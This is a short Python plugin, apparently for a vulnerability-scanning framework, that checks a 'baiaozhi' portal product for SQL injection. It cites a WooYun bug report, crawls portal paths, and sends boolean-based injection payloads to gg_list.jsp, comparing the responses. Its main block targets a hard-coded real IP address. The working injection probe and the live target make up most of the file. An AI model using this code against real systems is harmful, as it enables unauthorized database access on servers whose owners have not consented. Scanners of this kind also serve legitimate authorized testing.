#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0107187

import re

def matchurl(arg):
    arg = arg + 'portal/'
    code, head, res, errcode, _ = curl.curl2(arg)
    m = re.findall('/portal/root/(.*?)/',res)
    m1 = []
    for data in m:
        if data in m1:pass
        else :m1.append(data)
     
    urllist = []  
    for data in m1:
        url = arg + 'root/' + data + '/gg_list.jsp'
        code, head, res, errcode, _ = curl.curl2(url)
        if code ==200 :
            urllist.append(url)
    return urllist


def assign(service, arg):
    if service == "baiaozhi":
        return True, arg
        
        
def audit(arg): 
    arglist = matchurl(arg)
    for arg in arglist:
        payload1 = '?nowlx=m%27%20or%20%271%27=%271'
        payload2 = '?nowlx=m%27%20or%20%271%27=%272'
        url1 = arg + payload1
        url2 = arg + payload2
        code1, head, res1, errcode, _ = curl.curl2(url1)
        code2, head, res2, errcode, _ = curl.curl2(url2)
        m1 = re.search('class="gray"', res1)
        m2 = re.search('class="gray"', res2)
        if code1 == 200 and code2 ==200 and m1 and m2==None:
            security_hole(arg +'?nowlx=m'+'  :found sql Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('baiaozhi', 'http://218.75.123.195:8181/')[1])

   
    
    
    
    
    
    
    
    
    
    
    
    